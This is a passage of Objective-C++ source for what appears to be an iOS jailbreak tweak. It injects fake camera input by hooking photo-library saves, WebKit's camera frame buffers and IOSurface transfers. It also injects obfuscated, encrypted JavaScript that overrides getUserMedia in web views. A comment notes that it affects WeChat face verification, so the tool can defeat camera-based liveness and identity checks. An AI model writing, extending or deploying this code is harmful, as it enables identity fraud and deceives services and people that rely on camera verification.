                                    vcam_log(@"PHAsset video data REPLACED with virtual recording");
                                    if (orig) orig(_self, sel, type, vData, options);
                                    return;
                                }
                            }
                            // Photo resource
                            if ((type == 1) && data && gLastCaptureTime > 0
                                && (CACurrentMediaTime() - gLastCaptureTime) < 10.0) {
                                NSData *replaced = vcam_currentFrameAsJPEG();
                                if (replaced) {
                                    vcam_log(@"PHAsset data REPLACED");
                                    if (orig) orig(_self, sel, type, replaced, options);
                                    return;
                                }
                            }
                        }
                    } @catch (NSException *e) {}
                    if (orig) orig(_self, sel, type, data, options);
                });
                method_setImplementation(m, ni);
                vcam_log(@"Hooked PHAssetCreationRequest addResource:data:");
            }
        }
        {
            SEL sel = @selector(addResourceWithType:fileURL:options:);
            Method m = class_getInstanceMethod(crCls, sel);
            if (m) {
                typedef void (*F)(id, SEL, NSInteger, NSURL *, id);
                F orig = (F)method_getImplementation(m);
                IMP ni = imp_implementationWithBlock(^(id _self, NSInteger type, NSURL *fileURL, id options) {
                    vcam_log([NSString stringWithFormat:@"PHAsset addResource:fileURL type=%ld url=%@", (long)type, fileURL]);
                    @try {
                        if (vcam_isEnabled()) {
                            // Video resource types: 2=video, 6=fullSizeVideo, 9=pairedVideo, 10=fullSizePairedVideo
                            if ((type == 2 || type == 6 || type == 9 || type == 10) && gVirtualRecordingURL) {
                                NSFileManager *fm = [NSFileManager defaultManager];
                                if ([fm fileExistsAtPath:[gVirtualRecordingURL path]]) {
                                    vcam_log(@"PHAsset video fileURL REPLACED with virtual recording");
                                    if (orig) orig(_self, sel, type, gVirtualRecordingURL, options);
                                    return;
                                }
                            }
                            // Photo resource types
                            if ((type == 1 || type == 2) && gLastCaptureTime > 0
                                && (CACurrentMediaTime() - gLastCaptureTime) < 10.0) {
                                NSData *replaced = vcam_currentFrameAsJPEG();
                                if (replaced) {
                                    NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:@"vcam_photo.jpg"];
                                    if ([replaced writeToFile:tmp atomically:YES]) {
                                        vcam_log(@"PHAsset fileURL REPLACED");
                                        if (orig) orig(_self, sel, type, [NSURL fileURLWithPath:tmp], options);
                                        return;
                                    }
                                }
                            }
                        }
                    } @catch (NSException *e) {}
                    if (orig) orig(_self, sel, type, fileURL, options);
                });
                method_setImplementation(m, ni);
                vcam_log(@"Hooked PHAssetCreationRequest addResource:fileURL:");
            }
        }
    }

    // Hook PHAssetChangeRequest class methods (Camera app may use these)
    Class chCls = objc_getClass("PHAssetChangeRequest");
    if (chCls) {
        // +creationRequestForAssetFromImage:
        {
            SEL sel = @selector(creationRequestForAssetFromImage:);
            Method m = class_getClassMethod(chCls, sel);
            if (m) {
                typedef id (*F)(id, SEL, id);
                F orig = (F)method_getImplementation(m);
                IMP ni = imp_implementationWithBlock(^id(id _self, id image) {
                    vcam_log(@"PHAssetChangeRequest creationRequestForAssetFromImage: CALLED");
                    @try {
                        if (vcam_isEnabled() && gLastCaptureTime > 0
                            && (CACurrentMediaTime() - gLastCaptureTime) < 10.0) {
                            CIImage *ci = vcam_imageExists() ? vcam_loadStaticImage() : nil;
                            if (ci && gCICtx) {
                                CGImageRef cgImg = [gCICtx createCGImage:ci fromRect:ci.extent];
                                if (cgImg) {
                                    UIImage *newImg = [UIImage imageWithCGImage:cgImg];
                                    CGImageRelease(cgImg);
                                    if (newImg) {
                                        vcam_log(@"creationRequestForAssetFromImage REPLACED");
                                        return orig ? orig(_self, sel, newImg) : nil;
                                    }
                                }
                            }
                        }
                    } @catch (NSException *e) {}
                    return orig ? orig(_self, sel, image) : nil;
                });
                method_setImplementation(m, ni);
                vcam_log(@"Hooked PHAssetChangeRequest creationRequestForAssetFromImage:");
            }
        }
        // +creationRequestForAssetFromImageAtFileURL:
        {
            SEL sel = @selector(creationRequestForAssetFromImageAtFileURL:);
            Method m = class_getClassMethod(chCls, sel);
            if (m) {
                typedef id (*F)(id, SEL, NSURL *);
                F orig = (F)method_getImplementation(m);
                IMP ni = imp_implementationWithBlock(^id(id _self, NSURL *fileURL) {
                    vcam_log([NSString stringWithFormat:@"PHAssetChangeRequest creationRequestFromFileURL: %@", fileURL]);
                    @try {
                        if (vcam_isEnabled() && gLastCaptureTime > 0
                            && (CACurrentMediaTime() - gLastCaptureTime) < 10.0) {
                            NSData *replaced = vcam_currentFrameAsJPEG();
                            if (replaced) {
                                NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:@"vcam_photo.jpg"];
                                if ([replaced writeToFile:tmp atomically:YES]) {
                                    vcam_log(@"creationRequestFromFileURL REPLACED");
                                    return orig ? orig(_self, sel, [NSURL fileURLWithPath:tmp]) : nil;
                                }
                            }
                        }
                    } @catch (NSException *e) {}
                    return orig ? orig(_self, sel, fileURL) : nil;
                });
                method_setImplementation(m, ni);
                vcam_log(@"Hooked PHAssetChangeRequest creationRequestFromFileURL:");
            }
        }
        // +creationRequestForAssetFromVideoAtFileURL: (Camera app uses this for video recording)
        {
            SEL sel = @selector(creationRequestForAssetFromVideoAtFileURL:);
            Method m = class_getClassMethod(chCls, sel);
            if (m) {
                typedef id (*F)(id, SEL, NSURL *);
                F orig = (F)method_getImplementation(m);
                IMP ni = imp_implementationWithBlock(^id(id _self, NSURL *fileURL) {
                    vcam_log([NSString stringWithFormat:@"PHAssetChangeRequest creationRequestFromVideoURL: %@", fileURL]);
                    @try {
                        if (vcam_isEnabled() && gVirtualRecordingURL) {
                            NSFileManager *fm = [NSFileManager defaultManager];
                            if ([fm fileExistsAtPath:[gVirtualRecordingURL path]]) {
                                vcam_log(@"creationRequestFromVideoURL REPLACED with virtual recording");
                                return orig ? orig(_self, sel, gVirtualRecordingURL) : nil;
                            }
                        }
                    } @catch (NSException *e) {}
                    return orig ? orig(_self, sel, fileURL) : nil;
                });
                method_setImplementation(m, ni);
                vcam_log(@"Hooked PHAssetChangeRequest creationRequestFromVideoURL:");
            }
        }
    }

    // Hook PHPhotoLibrary -performChanges:completionHandler: to trigger photo editing after save
    Class libCls = objc_getClass("PHPhotoLibrary");
    if (libCls) {
        SEL sel = @selector(performChanges:completionHandler:);
        Method m = class_getInstanceMethod(libCls, sel);
        if (m) {
            typedef void (*F)(id, SEL, id, id);
            F orig = (F)method_getImplementation(m);
            IMP ni = imp_implementationWithBlock(^(id _self, id changeBlock, id completion) {
                // Skip interception for our own edit calls
                if (gIsVCamEditing) {
                    vcam_log(@"performChanges: our own edit, passing through");
                    if (orig) orig(_self, sel, changeBlock, completion);
                    return;
                }

                BOOL shouldEdit = vcam_isEnabled() && gLastCaptureTime > 0
                    && (CACurrentMediaTime() - gLastCaptureTime) < 15.0;

                vcam_log([NSString stringWithFormat:@"PHPhotoLibrary performChanges called, shouldEdit=%@",
                    shouldEdit ? @"YES" : @"NO"]);

                if (shouldEdit) {
                    // Wrap completion to trigger photo editing after save succeeds
                    void (^origCompletion)(BOOL, NSError *) = (void (^)(BOOL, NSError *))completion;
                    void (^wrappedCompletion)(BOOL, NSError *) = ^(BOOL success, NSError *error) {
                        vcam_log([NSString stringWithFormat:@"performChanges done: %@ err=%@",
                            success ? @"OK" : @"FAIL", error]);
                        if (success) {
                            // Edit photo immediately after save completes
                            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.3 * NSEC_PER_SEC)),
                                dispatch_get_global_queue(0, 0), ^{
                                    vcam_editLatestPhoto();
                                });
                        }
                        if (origCompletion) origCompletion(success, error);
                    };
                    if (orig) orig(_self, sel, changeBlock, (id)wrappedCompletion);
                } else {
                    if (orig) orig(_self, sel, changeBlock, completion);
                }
            });
            method_setImplementation(m, ni);
            vcam_log(@"Hooked PHPhotoLibrary performChanges:");
        }
    }
}



// --- WebContent CVPixelBuffer hook (intercept camera frames from GPU process) ---
// On iOS 16, camera frames are captured in com.apple.WebKit.GPU and sent to
// WebContent via IOSurface IPC. ObjC hooks don't see them. But WebKit must call
// CVPixelBufferLockBaseAddress to read pixel data — we intercept there.
// MSHookFunction loaded at runtime via dlsym (avoids link-time substrate dependency)
typedef void (*MSHookFunction_t)(void *, void *, void **);
static MSHookFunction_t _pMSHookFunction = NULL;
static CVReturn (*orig_WC_CVPBLockBA)(CVPixelBufferRef, CVPixelBufferLockFlags) = NULL;
static __thread int sWC_InReplace = 0;
static int sWC_LockLogCount = 0;

static CVReturn hooked_WC_CVPBLockBA(CVPixelBufferRef pb, CVPixelBufferLockFlags flags) {
    CVReturn ret = orig_WC_CVPBLockBA(pb, flags);
    if (ret == kCVReturnSuccess && !sWC_InReplace && pb && vcam_isEnabled()) {
        OSType fmt = CVPixelBufferGetPixelFormatType(pb);
        // Camera YUV bi-planar formats (420v = VideoRange, 420f = FullRange)
        if (fmt == kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange ||
            fmt == kCVPixelFormatType_420YpCbCr8BiPlanarFullRange) {
            size_t w = CVPixelBufferGetWidth(pb);
            size_t h = CVPixelBufferGetHeight(pb);
            // Camera-like dimensions (skip tiny thumbnails and huge display surfaces)
            if (w >= 480 && h >= 480 && w <= 1920 && h <= 1920) {
                if (sWC_LockLogCount < 5) {
                    sWC_LockLogCount++;
                    vcam_log([NSString stringWithFormat:@"WC: CVPBLock camera %zux%zu fmt=0x%x flags=%u",
                        w, h, (unsigned)fmt, (unsigned)flags]);
                }
                // Unlock the read lock, replace pixels, re-lock
                CVPixelBufferUnlockBaseAddress(pb, flags);
                sWC_InReplace = 1;
                BOOL ok = vcam_replacePixelBuffer(pb);
                sWC_InReplace = 0;
                if (sWC_LockLogCount >= 5 && sWC_LockLogCount < 8) {
                    sWC_LockLogCount++;
                    vcam_log([NSString stringWithFormat:@"WC: CVPBLock replace=%@", ok ? @"OK" : @"FAIL"]);
                }
                return orig_WC_CVPBLockBA(pb, flags);
            }
        }
    }
    return ret;
}

// --- IOSurface hooks for WebContent (intercept GPU→WebContent frame transfer) ---
// Forward declare additional IOSurface functions we need
extern "C" IOSurfaceRef IOSurfaceLookupFromMachPort(mach_port_t port);
extern "C" int IOSurfaceUnlock(IOSurfaceRef surface, IOSurfaceLockOptions options, uint32_t *seed);
extern "C" void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
extern "C" size_t IOSurfaceGetBytesPerRow(IOSurfaceRef surface);

static int (*orig_IOSurfaceLock)(IOSurfaceRef, IOSurfaceLockOptions, uint32_t *) = NULL;
static IOSurfaceRef (*orig_IOSurfaceLookupFromMachPort)(mach_port_t) = NULL;
static int sIOSLogCount = 0;

static int hooked_IOSurfaceLock(IOSurfaceRef surface, IOSurfaceLockOptions options, uint32_t *seed) {
    int ret = orig_IOSurfaceLock(surface, options, seed);
    if (ret == 0 && surface && vcam_isEnabled()) {
        size_t w = IOSurfaceGetWidth(surface);
        size_t h = IOSurfaceGetHeight(surface);
        uint32_t fmt = IOSurfaceGetPixelFormat(surface);
        // Log all surfaces in camera-like size range
        if (w >= 320 && h >= 240 && w <= 1920 && h <= 1920) {
            if (sIOSLogCount < 30) {
                sIOSLogCount++;
                vcam_log([NSString stringWithFormat:@"WC: IOSLock %zux%zu fmt=0x%x(%c%c%c%c) opts=%u",
                    w, h, fmt,
                    (char)(fmt>>24), (char)(fmt>>16), (char)(fmt>>8), (char)fmt,
                    (unsigned)options]);
            }
            // If it's a camera YUV format, try to replace
            if (fmt == kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange ||
                fmt == kCVPixelFormatType_420YpCbCr8BiPlanarFullRange ||
                fmt == '2vuy' || fmt == 'yuvs' || fmt == 'BGRA') {
                void *base = IOSurfaceGetBaseAddress(surface);
                size_t bpr = IOSurfaceGetBytesPerRow(surface);
                if (base && sIOSLogCount < 35) {
                    vcam_log([NSString stringWithFormat:@"WC: IOSLock base=%p bpr=%zu — camera candidate",
                        base, bpr]);
                }
            }
        }
    }
    return ret;
}

static IOSurfaceRef hooked_IOSurfaceLookupFromMachPort(mach_port_t port) {
    IOSurfaceRef surface = orig_IOSurfaceLookupFromMachPort(port);
    if (surface) {
        size_t w = IOSurfaceGetWidth(surface);
        size_t h = IOSurfaceGetHeight(surface);
        uint32_t fmt = IOSurfaceGetPixelFormat(surface);
        if (w >= 320 && h >= 240 && sIOSLogCount < 30) {
            sIOSLogCount++;
            vcam_log([NSString stringWithFormat:@"WC: IOSLookup %zux%zu fmt=0x%x(%c%c%c%c) port=%u",
                w, h, fmt,
                (char)(fmt>>24), (char)(fmt>>16), (char)(fmt>>8), (char)fmt,
                port]);
        }
    }
    return surface;
}

// --- WebContent hooks (actual frame replacement) ---
static void vcam_webcontent_installHooks(void) {
    @try {
        // 1. Hook WebCoreAVVideoCaptureSourceObserver directly
        Class wcObserver = objc_getClass("WebCoreAVVideoCaptureSourceObserver");
        if (wcObserver) {
            vcam_hookClass(wcObserver);
            vcam_log(@"WC: Hooked WebCoreAVVideoCaptureSourceObserver");
        } else {
            vcam_log(@"WC: WebCoreAVVideoCaptureSourceObserver NOT FOUND");
        }

        // 2. Hook AVCaptureVideoDataOutput setSampleBufferDelegate:queue:
        //    (to dynamically catch any other delegate classes)
        Class vdoClass = objc_getClass("AVCaptureVideoDataOutput");
        if (vdoClass) {
            SEL sel = @selector(setSampleBufferDelegate:queue:);
            Method m = class_getInstanceMethod(vdoClass, sel);
            if (m) {
                typedef void (*F)(id, SEL, id, dispatch_queue_t);
                F orig = (F)method_getImplementation(m);
                IMP ni = imp_implementationWithBlock(^(id _self, id delegate, dispatch_queue_t queue) {
                    @try {
                        if (delegate) {
                            Class dcls = object_getClass(delegate);
                            NSString *cn = NSStringFromClass(dcls);
                            vcam_log([NSString stringWithFormat:@"WC setDelegate: %@", cn]);
                            vcam_hookClass(dcls);
                        }
                    } @catch (NSException *e) {}
                    if (orig) orig(_self, sel, delegate, queue);
                });
                method_setImplementation(m, ni);
                vcam_log(@"WC: Hooked AVCaptureVideoDataOutput setSampleBufferDelegate:");
            }
        }

        // 3. Hook AVCaptureSession startRunning (for logging)
        Class sessClass = objc_getClass("AVCaptureSession");
        if (sessClass) {
            SEL sel = @selector(startRunning);
            Method m = class_getInstanceMethod(sessClass, sel);
            if (m) {
                typedef void (*F)(id, SEL);
                F orig = (F)method_getImplementation(m);
                IMP ni = imp_implementationWithBlock(^(id _self) {
                    if (orig) orig(_self, sel);
                    vcam_log(@"WC: AVCaptureSession startRunning");
                });
                method_setImplementation(m, ni);
            }
        }

        // 4. Hook AVSampleBufferDisplayLayer enqueueSampleBuffer: (WebRTC rendering)
        Class sbdlClass = objc_getClass("AVSampleBufferDisplayLayer");
        if (sbdlClass) {
            SEL sel = @selector(enqueueSampleBuffer:);
            Method m = class_getInstanceMethod(sbdlClass, sel);
            if (m) {
                typedef void (*F)(id, SEL, CMSampleBufferRef);
                F orig = (F)method_getImplementation(m);
                IMP ni = imp_implementationWithBlock(^(id _self, CMSampleBufferRef sb) {
                    @try {
                        if (vcam_isEnabled() && sb) vcam_replaceInPlace(sb);
                    } @catch (NSException *e) {}
                    if (orig) orig(_self, sel, sb);
                });
                method_setImplementation(m, ni);
            }
        }

        // 5. Hook AVCaptureVideoDataOutput internal methods that handle remote (GPU process) frames
        if (vdoClass) {
            // _handleRemoteQueueOperation: — handles IPC operations from GPU process
            SEL selRQ = sel_registerName("_handleRemoteQueueOperation:");
            Method mRQ = class_getInstanceMethod(vdoClass, selRQ);
            if (mRQ) {
                typedef void (*FRQ)(id, SEL, id);
                FRQ origRQ = (FRQ)method_getImplementation(mRQ);
                __block int rqLogCount = 0;
                IMP niRQ = imp_implementationWithBlock(^(id _self, id op) {
                    if (rqLogCount < 5) {
                        rqLogCount++;
                        vcam_log([NSString stringWithFormat:@"WC: _handleRemoteQueueOp: %@", [op class]]);
                    }
                    if (origRQ) origRQ(_self, selRQ, op);
                });
                method_setImplementation(mRQ, niRQ);
                vcam_log(@"WC: Hooked _handleRemoteQueueOperation:");
            }

            // _processSampleBuffer: — processes incoming sample buffer
            SEL selPSB = sel_registerName("_processSampleBuffer:");
            Method mPSB = class_getInstanceMethod(vdoClass, selPSB);
            if (mPSB) {
                typedef void (*FPSB)(id, SEL, CMSampleBufferRef);
                FPSB origPSB = (FPSB)method_getImplementation(mPSB);
                __block int psbLogCount = 0;
                IMP niPSB = imp_implementationWithBlock(^(id _self, CMSampleBufferRef sb) {
                    if (psbLogCount < 5) {
                        psbLogCount++;
                        CVImageBufferRef pb = sb ? CMSampleBufferGetImageBuffer(sb) : NULL;
                        size_t w = pb ? CVPixelBufferGetWidth(pb) : 0;
                        size_t h = pb ? CVPixelBufferGetHeight(pb) : 0;
                        vcam_log([NSString stringWithFormat:@"WC: _processSampleBuffer %zux%zu", w, h]);
                    }
                    @try {
                        if (vcam_isEnabled() && sb) vcam_replaceInPlace(sb);
                    } @catch (NSException *e) {}
                    if (origPSB) origPSB(_self, selPSB, sb);
                });
                method_setImplementation(mPSB, niPSB);
                vcam_log(@"WC: Hooked _processSampleBuffer:");
            }
        }

        // 6. Scan for Remote* ObjC classes that might handle IPC frame delivery from GPU
        {
            unsigned int clsCount = 0;
            Class *allClasses = objc_copyClassList(&clsCount);
            int remoteHooked = 0;
            if (allClasses) {
                for (unsigned int i = 0; i < clsCount; i++) {
                    NSString *cn = NSStringFromClass(allClasses[i]);
                    if (!cn) continue;
                    NSString *lower = [cn lowercaseString];
                    // Look for classes with Remote + video/sample/frame/capture/source keywords
                    if ([lower containsString:@"remote"] &&
                        ([lower containsString:@"video"] || [lower containsString:@"sample"] ||
                         [lower containsString:@"frame"] || [lower containsString:@"capture"] ||
                         [lower containsString:@"source"] || [lower containsString:@"media"])) {
                        // Dump methods of this class
                        unsigned int mc = 0;
                        Method *methods = class_copyMethodList(allClasses[i], &mc);
                        if (methods && mc > 0) {
                            vcam_log([NSString stringWithFormat:@"WC Remote class: %@ (%u methods)", cn, mc]);
                            for (unsigned int j = 0; j < mc && j < 30; j++) {
                                NSString *selName = NSStringFromSelector(method_getName(methods[j]));
                                NSString *selLower = [selName lowercaseString];
                                // Log methods related to frames/samples
                                if ([selLower containsString:@"sample"] || [selLower containsString:@"frame"] ||
                                    [selLower containsString:@"buffer"] || [selLower containsString:@"surface"] ||
                                    [selLower containsString:@"video"] || [selLower containsString:@"output"] ||
                                    [selLower containsString:@"receive"] || [selLower containsString:@"deliver"]) {
                                    vcam_log([NSString stringWithFormat:@"  -[%@ %@]", cn, selName]);
                                }
                            }
                            free(methods);
                        }
                        remoteHooked++;
                    }
                }
                free(allClasses);
            }
            vcam_log([NSString stringWithFormat:@"WC: Scanned %d Remote video/frame classes", remoteHooked]);
        }

        vcam_log(@"WC: Hooks installed");
        // Register controls notification for web mode
        CFNotificationCenterAddObserver(
            CFNotificationCenterGetDarwinNotifyCenter(), NULL,
            vcam_controlsChangedNotif,
            (__bridge CFStringRef)_ds("\x54\x58\x5A\x19\x41\x54\x56\x5A\x47\x5B\x42\x44\x19\x54\x43\x45\x5B",17), NULL,
            CFNotificationSuspensionBehaviorDeliverImmediately);
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"WC: installHooks EXCEPTION: %@", e]);
    }
}




// --- WKScriptMessageHandler for Web Mode MJPEG Streaming ---
// JS requests frame via messageHandler, native reads stream.jpg, base64 encodes,
// sends back via evaluateJavaScript. JS uses data: URL (same-origin, no canvas taint).
// Frame-aware evaluateJavaScript: sends JS back to the CORRECT frame (not just main frame)
// Critical for iframes — regular evaluateJavaScript: only runs in main frame
static void vcam_evalJSInFrame(id webView, id message, NSString *js) {
    @try {
        SEL frameSel = @selector(evaluateJavaScript:inFrame:inContentWorld:completionHandler:);
        if ([webView respondsToSelector:frameSel]) {
            id frameInfo = [message valueForKey:@"frameInfo"];
            Class worldClass = objc_getClass("WKContentWorld");
            id pageWorld = ((id(*)(Class,SEL))objc_msgSend)(worldClass, @selector(pageWorld));
            ((void(*)(id,SEL,id,id,id,id))objc_msgSend)(webView, frameSel, js, frameInfo, pageWorld, nil);
        } else {
            // Fallback for older iOS (shouldn't happen on iOS 16)
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
            [webView performSelector:@selector(evaluateJavaScript:completionHandler:) withObject:js withObject:nil];
#pragma clang diagnostic pop
        }
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"vcam_evalJSInFrame error: %@", e]);
    }
}

@protocol WKScriptMessageHandler <NSObject>
- (void)userContentController:(id)ucc didReceiveScriptMessage:(id)message;
@end
@interface FMHdl : NSObject <WKScriptMessageHandler>
- (void)userContentController:(id)ucc didReceiveScriptMessage:(id)message;
@end
@implementation FMHdl
- (void)userContentController:(id)ucc didReceiveScriptMessage:(id)message {
    @try {
        static int sMsgCount = 0;
        sMsgCount++;
        id webView = [message valueForKey:@"webView"];
        if (!webView) { if (sMsgCount <= 3) vcam_log(@"WebFrame: no webView"); return; }
        // Handle diagnostic/control messages from JS
        NSString *body = [message valueForKey:@"body"];
        if ([body isKindOfClass:[NSString class]]) {
            // Diagnostic messages from JS
            if ([body hasPrefix:@"vcam-"]) {
                vcam_log([NSString stringWithFormat:@"WebFrame: %@", body]);
                return;
            }
            if ([body hasPrefix:@"dim:"]) {
                vcam_log([NSString stringWithFormat:@"WebFrame: JS canvas dimensions = %@", body]);
                return;
            }
            // Controls query: JS polls for current floating window controls
            if ([body isEqualToString:@"ctrl"]) {
                @try {
                    NSString *content = [NSString stringWithContentsOfFile:VCAM_FLAG encoding:NSUTF8StringEncoding error:nil];
                    if (content && content.length >= 3) {
                        NSArray *parts = [content componentsSeparatedByString:@","];
                        if (parts.count >= 7) {
                            // Send idx, rot, flip, pause, offX, offY to JS
                            NSString *js = [NSString stringWithFormat:
                                @"if(window.__vcamCtrl)window.__vcamCtrl(%@,%@,%@,%@,%@,%@);",
                                parts[1], parts[2], parts[3], parts[4], parts[5], parts[6]];
                            vcam_evalJSInFrame(webView, message, js);
                        }
                    }
                } @catch (NSException *e) {}
                return;
            }
            // Video switch: JS requests video for a specific index
            if ([body hasPrefix:@"switchVideo:"]) {
                @try {
                    int idx = [[body substringFromIndex:12] intValue];
                    NSString *videoPath = VCAM_VIDEO;
                    if (idx > 0) {
                        NSArray *exts = @[@"mp4", @"MP4", @"mov", @"MOV", @"m4v", @"M4V"];
                        for (NSString *ext in exts) {
                            NSString *p = [NSString stringWithFormat:@"%@/%d.%@", VCAM_DIR, idx, ext];
                            if ([[NSFileManager defaultManager] fileExistsAtPath:p]) { videoPath = p; break; }
                        }
                    }
                    NSData *videoData = [NSData dataWithContentsOfFile:videoPath];
                    if (videoData && videoData.length > 0) {
                        NSString *vb64 = [videoData base64EncodedStringWithOptions:0];
                        vcam_log([NSString stringWithFormat:@"WebFrame: switchVideo:%d - sending %lu bytes", idx, (unsigned long)videoData.length]);
                        NSString *vjs = [NSString stringWithFormat:@"if(window.__vcamOnVideo)window.__vcamOnVideo('%@');", vb64];
                        vcam_evalJSInFrame(webView, message, vjs);
                    }
                } @catch (NSException *e) {}
                return;
            }
            if ([body isEqualToString:@"getVideo"]) {
                // On-demand video loading: read video based on current control index
                NSString *videoPath = VCAM_VIDEO;
                @try {
                    NSString *content = [NSString stringWithContentsOfFile:VCAM_FLAG encoding:NSUTF8StringEncoding error:nil];
                    if (content) {
                        NSArray *parts = [content componentsSeparatedByString:@","];
                        if (parts.count >= 2) {
                            int idx = [parts[1] intValue];
                            if (idx > 0) {
                                NSArray *exts = @[@"mp4", @"MP4", @"mov", @"MOV", @"m4v", @"M4V"];
                                for (NSString *ext in exts) {
                                    NSString *p = [NSString stringWithFormat:@"%@/%d.%@", VCAM_DIR, idx, ext];
                                    if ([[NSFileManager defaultManager] fileExistsAtPath:p]) { videoPath = p; break; }
                                }
                            }
                        }
                    }
                } @catch (NSException *e) {}
                NSData *videoData = [NSData dataWithContentsOfFile:videoPath];
                if (!videoData || videoData.length == 0) {
                    vcam_log([NSString stringWithFormat:@"WebFrame: getVideo - %@ not found", videoPath]);
                    vcam_evalJSInFrame(webView, message, @"if(window.__vcamOnVideo)window.__vcamOnVideo(null);");
                    return;
                }
                NSString *vb64 = [videoData base64EncodedStringWithOptions:0];
                vcam_log([NSString stringWithFormat:@"WebFrame: getVideo - sending %lu bytes from %@",
                    (unsigned long)videoData.length, [videoPath lastPathComponent]]);
                NSString *vjs = [NSString stringWithFormat:@"if(window.__vcamOnVideo)window.__vcamOnVideo('%@');", vb64];
                vcam_evalJSInFrame(webView, message, vjs);
                return;
            }
            if ([body isEqualToString:@"getImage"]) {
                // On-demand image loading
                NSData *imgData = [NSData dataWithContentsOfFile:VCAM_IMAGE];
                if (!imgData || imgData.length == 0) {
                    vcam_evalJSInFrame(webView, message, @"if(window.__vcamOnImage)window.__vcamOnImage(null);");
                    return;
                }
                NSString *ib64 = [imgData base64EncodedStringWithOptions:0];
                NSString *ijs = [NSString stringWithFormat:@"if(window.__vcamOnImage)window.__vcamOnImage('%@');", ib64];
                vcam_evalJSInFrame(webView, message, ijs);
                return;
            }
        }
        // Cache last good JPEG so brief PC hiccups don't return empty
        // (which would make web canvas freeze / video element flicker).
        static NSData *sLastWebJPEG = nil;
        NSData *jpegData = [NSData dataWithContentsOfFile:VCAM_STREAM_FRAME];
        if (!jpegData || jpegData.length == 0) {
            if (sLastWebJPEG) {
                jpegData = sLastWebJPEG;  // serve last good frame
            } else {
                if (sMsgCount <= 5) vcam_log([NSString stringWithFormat:@"WebFrame: stream.jpg empty/missing (req #%d)", sMsgCount]);
                return;
            }
        } else {
            sLastWebJPEG = jpegData;
        }
        NSString *b64 = [jpegData base64EncodedStringWithOptions:0];
        if (sMsgCount <= 3) {
            vcam_log([NSString stringWithFormat:@"WebFrame: sending frame #%d (%lu bytes, b64 %lu chars)",
                sMsgCount, (unsigned long)jpegData.length, (unsigned long)b64.length]);
        }
        NSString *js = [NSString stringWithFormat:@"if(window.__vcamOnFrame)window.__vcamOnFrame('%@');", b64];
        vcam_evalJSInFrame(webView, message, js);
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"WebFrame: exception: %@", e]);
    }
}
@end

// --- Web Camera: JavaScript getUserMedia override ---
// Builds JS that overrides navigator.mediaDevices.getUserMedia with canvas-based virtual camera
// Supports stream (MJPEG), video (mp4) and static image (jpg) modes
static BOOL gWebCamIsVideo = NO; // for logging

static NSString *vcam_buildWebCamJS(void) {
    @try {
        if (!_isAuth() || !VCAM_CHK_C()) {
            if (!VCAM_CHK_C()) { _aS1 = 0; _aS2 = 0; _aS3 = 0; _aS4 = 0; }
            vcam_log(@"WebCam JS: disabled (auth)");
            return nil;
        }
        // Only inject JS when virtual camera is actually enabled
        // Prevents interference with apps like WeChat face verification when vcam is off
        if (!vcam_isEnabled()) {
            return nil;
        }
        if (![[NSFileManager defaultManager] fileExistsAtPath:VCAM_FLAG]) {
            vcam_log(@"WebCam JS: disabled (no flag)");
            return nil;
        }

        // [NOKEY] friend version: JS embedded encrypted in vcam_friend_js.mm (XOR + per-build key).
        // strings(1) on the dylib won't yield readable JS; decoder is in vcam_friend_js.mm.
        // Both Tweak.xm (.mm intermediate) and vcam_friend_js.mm are ObjC++, so plain
        // `extern` declarations produce matching C++ mangled symbols on both sides.
        extern NSString *VCAM_FRIEND_JS_STREAM_GET(void);
        extern NSString *VCAM_FRIEND_JS_VIDEO_GET(void);
        extern NSString *VCAM_FRIEND_JS_IMAGE_GET(void);
        NSString *js_s = VCAM_FRIEND_JS_STREAM_GET();
        NSString *js_v = VCAM_FRIEND_JS_VIDEO_GET();
        NSString *js_i = VCAM_FRIEND_JS_IMAGE_GET();
        NSString *prefix = @"window.__vcamU='';"; // no UDID binding in friend

        // Determine mode: stream > video > image
        if (vcam_streamFrameExists()) {
            vcam_log(@"WebCam JS: STREAM mode (embedded)");
            gWebCamIsVideo = NO;
            return [prefix stringByAppendingString:js_s];
        }

        NSFileManager *fm = [NSFileManager defaultManager];
        // Check current source: image takes priority if it exists (user last selected image)
        // because selecting image deletes VCAM_VIDEO, and selecting video deletes VCAM_IMAGE
        BOOL hasImage = [fm fileExistsAtPath:VCAM_IMAGE];
        BOOL hasVideo = NO;
        if (!hasImage) {
            hasVideo = [fm fileExistsAtPath:VCAM_VIDEO];
            if (!hasVideo) {
                NSArray *exts = @[@"mp4", @"MP4", @"mov", @"MOV", @"m4v", @"M4V"];
                for (int idx = 1; idx <= 6 && !hasVideo; idx++) {
                    for (NSString *ext in exts) {
                        NSString *p = [NSString stringWithFormat:@"%@/%d.%@", VCAM_DIR, idx, ext];
                        if ([fm fileExistsAtPath:p]) { hasVideo = YES; break; }
                    }
                }
            }
        }

        if (!hasVideo && !hasImage) {
            vcam_log(@"WebCam JS: no media available");
            return nil;
        }

        gWebCamIsVideo = hasVideo;
        vcam_log([NSString stringWithFormat:@"WebCam JS: %@ mode (embedded)",
            hasVideo ? @"VIDEO" : @"IMAGE"]);
        return [prefix stringByAppendingString:(hasVideo ? js_v : js_i)];
    } @catch (NSException *e) {
        return nil;
    }
}

// Installs WKWebView hook to inject getUserMedia override JS
static void vcam_installWebCamHook(void) {
    @try {
        Class wkClass = objc_getClass("WKWebView");
        if (!wkClass) { vcam_log(@"WebCam: WKWebView not found"); return; }

        SEL sel = @selector(initWithFrame:configuration:);
        Method m = class_getInstanceMethod(wkClass, sel);
        if (!m) { vcam_log(@"WebCam: initWithFrame:configuration: not found"); return; }

        typedef id (*F)(id, SEL, CGRect, id);
        F orig = (F)method_getImplementation(m);

        IMP ni = imp_implementationWithBlock(^id(id _self, CGRect frame, id config) {
            @try {
                NSString *js = vcam_buildWebCamJS();
                vcam_log([NSString stringWithFormat:@"WebCam[init]: WKWebView created, js=%@",
                    js ? [NSString stringWithFormat:@"YES(len=%lu)", (unsigned long)js.length] : @"NO"]);
                if (js) {
                    id ucc = [config valueForKey:@"userContentController"];
